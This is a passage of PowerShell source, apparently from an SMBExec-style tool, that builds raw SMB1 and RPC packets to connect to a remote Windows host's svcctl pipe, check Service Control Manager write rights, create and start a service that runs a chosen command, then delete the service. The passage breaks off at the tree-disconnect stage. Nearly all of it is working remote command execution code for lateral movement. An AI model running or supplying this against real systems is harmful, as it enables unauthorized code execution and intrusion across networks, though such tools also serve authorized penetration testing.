        $SMBExec_command_length_bytes = [System.BitConverter]::GetBytes($SMBExec_command_bytes.Length / 2)
        $SMB_split_index = 4256
        
        if($SMB_version -eq 'SMB1')
        {
            $stage = 'TreeConnectAndXRequest'

            while ($stage -ne 'Exit')
            {
            
                switch ($stage)
                {
            
                    'CheckAccess'
                    {

                        if([System.BitConverter]::ToString($client_receive[108..111]) -eq '00-00-00-00' -and [System.BitConverter]::ToString($client_receive[88..107]) -ne '00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00')
                        {
                            $SMB_service_manager_context_handle = $client_receive[88..107]

                            if($SMB_execute)
                            {
                                Write-Verbose "$output_username has Service Control Manager write privilege on $Target"  
                                $packet_SCM_data = New-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $SMBExec_command_bytes $SMBExec_command_length_bytes
                                $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data

                                if($SCM_data.Length -lt $SMB_split_index)
                                {
                                    $stage = 'CreateServiceW'
                                }
                                else
                                {
                                    $stage = 'CreateServiceW_First'
                                }

                            }
                            else
                            {
                                Write-Output "$output_username has Service Control Manager write privilege on $Target"
                                $SMB_close_service_handle_stage = 2
                                $stage = 'CloseServiceHandle'
                            }

                        }
                        elseif([System.BitConverter]::ToString($client_receive[108..111]) -eq '05-00-00-00')
                        {
                            Write-Output "[-] $output_username does not have Service Control Manager write privilege on $Target"
                            $stage = 'Exit'
                        }
                        else
                        {
                            Write-Output "[-] Something went wrong with $Target"
                            $stage = 'Exit'
                        }

                    }

                    'CloseRequest'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x04 0x18 0x07,0xc8 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBCloseRequest 0x00,0x40
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'TreeDisconnect'
                    }

                    'CloseServiceHandle'
                    {

                        if($SMB_close_service_handle_stage -eq 1)
                        {
                            Write-Verbose "Service $SMB_service deleted on $Target"
                            $SMB_close_service_handle_stage++
                            $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_context_handle
                        }
                        else
                        {
                            $stage = 'CloseRequest'
                            $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_manager_context_handle
                        }

                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x05,0x00,0x00,0x00 0x00,0x00 0x00,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                    }

                    'CreateAndXRequest'
                    {
                        $SMB_named_pipe_bytes = 0x5c,0x73,0x76,0x63,0x63,0x74,0x6c,0x00 # \svcctl
                        $SMB_tree_ID = $client_receive[28,29]
                        $packet_SMB_header = New-PacketSMBHeader 0xa2 0x18 0x02,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBNTCreateAndXRequest $SMB_named_pipe_bytes
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'RPCBind'
                    }
                  
                    'CreateServiceW'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID
                        
                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $packet_SCM_data = New-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $SMBExec_command_bytes $SMBExec_command_length_bytes
                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                             
                        $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'ReadAndXRequest'
                        $stage_next = 'StartServiceW'
                    }

                    'CreateServiceW_First'
                    {
                        $SMB_split_stage_final = [Math]::Ceiling($SCM_data.Length / $SMB_split_index)
                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SCM_data_first = $SCM_data[0..($SMB_split_index - 1)]
                        $packet_RPC_data = New-PacketRPCRequest 0x01 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_first
                        $packet_RPC_data["AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length)
                        $SMB_split_index_tracker = $SMB_split_index
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data     
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($SMB_split_stage_final -le 2)
                        {
                            $stage = 'CreateServiceW_Last'
                        }
                        else
                        {
                            $SMB_split_stage = 2
                            $stage = 'CreateServiceW_Middle'
                        }

                    }

                    'CreateServiceW_Middle'
                    {
                        $SMB_split_stage++
                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SCM_data_middle = $SCM_data[$SMB_split_index_tracker..($SMB_split_index_tracker + $SMB_split_index - 1)]
                        $SMB_split_index_tracker += $SMB_split_index
                        $packet_RPC_data = New-PacketRPCRequest 0x00 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_middle
                        $packet_RPC_data["AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length - $SMB_split_index_tracker + $SMB_split_index)
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data     
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($SMB_split_stage -ge $SMB_split_stage_final)
                        {
                            $stage = 'CreateServiceW_Last'
                        }
                        else
                        {
                            $stage = 'CreateServiceW_Middle'
                        }

                    }

                    'CreateServiceW_Last'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x48 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SCM_data_last = $SCM_data[$SMB_split_index_tracker..$SCM_data.Length]
                        $packet_RPC_data = New-PacketRPCRequest 0x02 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_last
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'ReadAndXRequest'
                        $stage_next = 'StartServiceW'
                    }

                    'DeleteServiceW'
                    { 

                        if([System.BitConverter]::ToString($client_receive[88..91]) -eq '1d-04-00-00')
                        {
                            Write-Output "[+] Command executed with service $SMB_service on $Target"
                        }
                        elseif([System.BitConverter]::ToString($client_receive[88..91]) -eq '02-00-00-00')
                        {
                            Write-Output "[-] Service $SMB_service failed to start on $Target"
                        }

                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $packet_SCM_data = New-PacketSCMDeleteServiceW $SMB_service_context_handle
                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x04,0x00,0x00,0x00 0x00,0x00 0x02,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data

                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'ReadAndXRequest'
                        $stage_next = 'CloseServiceHandle'
                        $SMB_close_service_handle_stage = 1
                    }

                    'Logoff'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x74 0x18 0x07,0xc8 0x34,0xfe $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBLogoffAndXRequest
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'Exit'
                    }

                    'OpenSCManagerW'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $packet_SCM_data = New-PacketSCMOpenSCManagerW $SMB_service_bytes $SMB_service_length
                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'ReadAndXRequest'
                        $stage_next = 'CheckAccess'           
                    }

                    'ReadAndXRequest'
                    {
                        Start-Sleep -m $Sleep
                        $packet_SMB_header = New-PacketSMBHeader 0x2e 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBReadAndXRequest $SMB_FID
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = $stage_next
                    }

                    'RPCBind'
                    {
                        $SMB_FID = $client_receive[42,43]
                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $packet_RPC_data = New-PacketRPCBind 0x48,0x00 1 0x01 0x00,0x00 $named_pipe_UUID 0x02,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'ReadAndXRequest'
                        $stage_next = 'OpenSCManagerW'
                    }
                
                    'StartServiceW'
                    {
                    
                        if([System.BitConverter]::ToString($client_receive[112..115]) -eq '00-00-00-00')
                        {
                            Write-Verbose "Service $SMB_service created on $Target"
                            $SMB_service_context_handle = $client_receive[92..111]
                            $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                            if($SMB_signing)
                            {
                                $packet_SMB_header["Flags2"] = 0x05,0x48
                                $SMB_signing_counter = $SMB_signing_counter + 2 
                                [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                                $packet_SMB_header["Signature"] = $SMB_signing_sequence
                            }

                            $packet_SCM_data = New-PacketSCMStartServiceW $SMB_service_context_handle
                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                            $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x03,0x00,0x00,0x00 0x00,0x00 0x13,0x00
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                            $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                             
                            $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                                $SMB_signature = $MD5.ComputeHash($SMB_sign)
                                $SMB_signature = $SMB_signature[0..7]
                                $packet_SMB_header["Signature"] = $SMB_signature
                                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                            Write-Verbose "[*] Trying to execute command on $Target"
                            $client_stream.Write($client_send,0,$client_send.Length) > $null
                            $client_stream.Flush()
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                            $stage = 'ReadAndXRequest'
                            $stage_next = 'DeleteServiceW'  
                        }
                        elseif([System.BitConverter]::ToString($client_receive[112..115]) -eq '31-04-00-00')
                        {
                            Write-Output "[-] Service $SMB_service creation failed on $Target"
                            $stage = 'Exit'
                        }
                        else
                        {
                            Write-Output "[-] Service creation fault context mismatch"
                            $stage = 'Exit'
                        }
    
                    }
                
                    'TreeConnectAndXRequest'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x75 0x18 0x01,0x48 0xff,0xff $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $MD5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBTreeConnectAndXRequest $SMB_path_bytes
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'CreateAndXRequest'
                    }

                    'TreeDisconnect'
                    {
